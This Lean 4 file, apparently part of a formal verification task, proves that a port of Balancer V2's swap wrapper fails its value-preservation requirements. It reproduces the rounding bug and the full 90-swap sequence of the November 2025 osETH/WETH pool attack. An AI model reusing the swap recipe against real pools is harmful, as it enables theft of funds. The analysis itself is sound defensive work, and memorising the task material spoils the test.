import Solution
import BalancerSwap.Sanity
import BalancerSwap.StableMath
/-!
Kernel-checked refutation of the port of Balancer V2's swap wrapper (`candidate/Solution.lean`,
also `attacks/balancer_port.lean`), in the shape of the November 2025 attack on Composable Stable
Pools: a batch of small given-out swaps against a pool whose balances were first pushed down to
a few wei.

The pool is the osETH/WETH Composable Stable Pool on Ethereum
(0xDACf5Fa19b1f720111609043ac67A9818262850c) in transaction
0x6ed07db1a9fe5c0794d44cd36081d6a6df103fab868cdd75d581e3bd23bc9742 (block 23717397). Token 0
is WETH (scaling factor 1e18), token 1 is osETH (scaling factor 1058132408689971699, the cached
osETH rate during the transaction), and the swap fee is 0.01%. The transaction's first 22 Swap
events sell BPT for WETH and osETH until the pool holds 67,000 wei of each (`startPool`). Swap
events 23 to 112 are 30 rounds of three given-out swaps: osETH out down to a balance of 18 wei,
then 17 wei of osETH out, then WETH out paid with osETH.

The exploit swap asks for 17 wei of osETH out of 18. Its exact value in 18-decimal units is
17 * 1.058132408689971699 = 17.988; the port rounds it down to 17 (`_upscale` uses `mulDown`),
so the pool math prices 17 of its 19 units out of the balance instead of 18 and charges about
half.

Part 1 uses `constantProduct`, which `BalancerSwap.Sanity` proves well behaved and
price-monotone, so each refutation below is a counterexample to a locked requirement. Four
rounds of the attack's shape halve the pool's value each round and take the pool's WETH from
67,000 to 4,193 wei.

Part 2 runs the port with `stableMath 200000 2`, the port of Balancer's StableMath with the
pool's amplification (A = 200, `getAmplificationParameter()` returns 200000), on the attack's
own 90 swaps. The kernel checks that the port charges exactly the amount in of each of the 90
Swap events, and that the pool's invariant D (computed by the StableMath port from the scaled
balances, as the pool computes it) falls from 137,893 to 2,445. Part 2 is a fidelity check of
the port against the chain; it is not a refutation, because StableMath is not proved well
behaved.
-/
open BalancerSwap

/-! ## Part 1: refutations with the constant-product math -/

/-- The pool after the transaction's first 22 Swap events: 67,000 wei of WETH and of osETH. -/
def startPool : Pool where
  n := 2
  balance k := if k = 0 then 67000 else if k = 1 then 67000 else 0
  rate := attackPool.rate
  fee := attackPool.fee

/-- Four rounds in the attack's shape: osETH out down to 18 wei, 17 wei of osETH out, then WETH
out paid with osETH, bringing the osETH balance back near 67,000. -/
def batch : List Swap := [
  ⟨.givenOut, 0, 1, 66982⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 2375365494⟩,
  ⟨.givenOut, 0, 1, 66982⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 1188037286⟩,
  ⟨.givenOut, 0, 1, 66982⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 594195912⟩,
  ⟨.givenOut, 0, 1, 66978⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 297187558⟩]

theorem batch_runs : (run onSwap constantProduct startPool batch).isSome := by decide

def afterBatch : Pool := (run onSwap constantProduct startPool batch).get batch_runs

theorem value_before : value constantProduct startPool = 4749898000 := by decide

theorem value_after : value constantProduct afterBatch = 297229191 := by decide

theorem balances_after : afterBatch.balance 0 = 4193 ∧ afterBatch.balance 1 = 66993 := by decide

/-- REQ-BATCH-KEEPS-VALUE fails on the port: the batch goes through and the pool's value falls
from 4,749,898,000 to 297,229,191. -/
theorem port_refuted_batch_keeps_value : ¬ BatchKeepsValue onSwap := by
  intro h
  have := h constantProduct startPool batch afterBatch constantProduct_wellBehaved
    (Option.some_get batch_runs).symm
  rw [value_before, value_after] at this
  revert this
  decide

/-- The port charges 3,182,320 wei of WETH for the exploit swap of `BalancerSwap.Sanity`
(17 wei of osETH out of 18, with 374,353 wei of WETH in the pool). -/
theorem port_charges_exploit : onSwap constantProduct attackPool exploitSwap = some 3182320 := by
  decide

/-- REQ-GIVEN-OUT-CHARGES-AT-LEAST fails on the port: the math prices the exact amount out,
rounded up, at 6,738,354 before the fee, and 3,182,320 after the fee is less. -/
theorem port_refuted_charges_at_least : ¬ GivenOutChargesAtLeast onSwap := by
  intro h
  have := h constantProduct attackPool exploitSwap 3182320 constantProduct_priceMonotone rfl
    (by decide) port_charges_exploit
  rw [exploit_outPrice] at this
  revert this
  decide

theorem exploit_step_runs : (step onSwap constantProduct attackPool exploitSwap).isSome := by decide

def afterExploit : Pool := (step onSwap constantProduct attackPool exploitSwap).get exploit_step_runs

/-- REQ-SWAP-KEEPS-VALUE fails on the port: the single exploit swap halves the pool's value,
from 374,353 * 19 = 7,112,707 to 3,556,673 * 1. -/
theorem port_refuted_swap_keeps_value : ¬ SwapKeepsValue onSwap := by
  intro h
  have := h constantProduct attackPool exploitSwap afterExploit constantProduct_wellBehaved
    (Option.some_get exploit_step_runs).symm
  revert this
  decide

/-! ## Part 2: the port with StableMath reproduces the attack on chain -/

/-- The amount each swap of a batch calculates, until the first one that reverts. -/
def quotes (m : PoolMath) : Pool → List Swap → List (Option Nat)
  | _, [] => []
  | p, s :: ss =>
    onSwap m p s :: match step onSwap m p s with
      | some p' => quotes m p' ss
      | none => []

/-- Swap events 23 to 112 of the transaction: (kind, token in, token out, amount out). -/
def attackSwaps : List Swap := [
  ⟨.givenOut, 0, 1, 66982⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 891000⟩,
  ⟨.givenOut, 0, 1, 5165⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 666000⟩,
  ⟨.givenOut, 0, 1, 9016⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 495000⟩,
  ⟨.givenOut, 0, 1, 12206⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 369000⟩,
  ⟨.givenOut, 0, 1, 17532⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 270000⟩,
  ⟨.givenOut, 0, 1, 14434⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 198000⟩,
  ⟨.givenOut, 0, 1, 11377⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 160000⟩,
  ⟨.givenOut, 0, 1, 22554⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 120000⟩,
  ⟨.givenOut, 0, 1, 17663⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 89100⟩,
  ⟨.givenOut, 0, 1, 12038⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 67500⟩,
  ⟨.givenOut, 0, 1, 10414⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 52200⟩,
  ⟨.givenOut, 0, 1, 9007⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 40500⟩,
  ⟨.givenOut, 0, 1, 7867⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 31500⟩,
  ⟨.givenOut, 0, 1, 6554⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 24300⟩,
  ⟨.givenOut, 0, 1, 5472⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 19800⟩,
  ⟨.givenOut, 0, 1, 4749⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 16200⟩,
  ⟨.givenOut, 0, 1, 4397⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 12600⟩,
  ⟨.givenOut, 0, 1, 3442⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 10800⟩,
  ⟨.givenOut, 0, 1, 3296⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 9000⟩,
  ⟨.givenOut, 0, 1, 2886⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 7371⟩,
  ⟨.givenOut, 0, 1, 2286⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 6480⟩,
  ⟨.givenOut, 0, 1, 2124⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 6075⟩,
  ⟨.givenOut, 0, 1, 2014⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 5589⟩,
  ⟨.givenOut, 0, 1, 1902⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 4779⟩,
  ⟨.givenOut, 0, 1, 1730⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 4455⟩,
  ⟨.givenOut, 0, 1, 1664⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 3969⟩,
  ⟨.givenOut, 0, 1, 1562⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 3726⟩,
  ⟨.givenOut, 0, 1, 1492⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 3645⟩,
  ⟨.givenOut, 0, 1, 1484⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 3564⟩,
  ⟨.givenOut, 0, 1, 1444⟩, ⟨.givenOut, 0, 1, 17⟩, ⟨.givenOut, 1, 0, 3564⟩]

def onChainAmountsIn : List (Option Nat) := [
  some 307353, some 625492, some 5182, some 173500, some 467227, some 9033,
  some 132041, some 342353, some 12223, some 100574, some 248534, some 17549,
  some 81018, some 180744, some 14451, some 59801, some 132219, some 11394,
  some 43522, some 97179, some 22571, some 46521, some 72880, some 17680,
  some 34992, some 55507, some 12055, some 24595, some 40578, some 10431,
  some 19485, some 31093, some 9024, some 15863, some 23232, some 7884,
  some 12817, some 17991, some 6571, some 10203, some 13414, some 5489,
  some 8237, some 11093, some 4766, some 6908, some 8499, some 4414,
  some 6056, some 6537, some 3459, some 4937, some 5309, some 3313,
  some 4365, some 4440, some 2903, some 3926, some 3590, some 2303,
  some 3137, some 3131, some 2141, some 2937, some 3098, some 2031,
  some 2827, some 2670, some 1919, some 2385, some 2200, some 1747,
  some 2189, some 2173, some 1681, some 2109, some 1716, some 1579,
  some 1984, some 1701, some 1509, some 1909, some 1692, some 1501,
  some 1893, some 1687, some 1461, some 1858, some 1685, some 1471]

/-- The amounts in of Swap events 23 to 112, as logged by the Vault. -/
theorem port_reproduces_chain :
    quotes (stableMath 200000 2) startPool attackSwaps = onChainAmountsIn := by decide

theorem stable_runs : (run onSwap (stableMath 200000 2) startPool attackSwaps).isSome := by decide

def afterStable : Pool := (run onSwap (stableMath 200000 2) startPool attackSwaps).get stable_runs

/-- The pool ends with 889 wei of WETH and 1,472 wei of osETH, the balances the chain shows
before the transaction buys BPT back, and its invariant D falls from 137,893 to 2,445. -/
theorem stable_attack_effect :
    afterStable.balance 0 = 889 ∧ afterStable.balance 1 = 1472 ∧
    value (stableMath 200000 2) startPool = 137893 ∧
    value (stableMath 200000 2) afterStable = 2445 := by decide
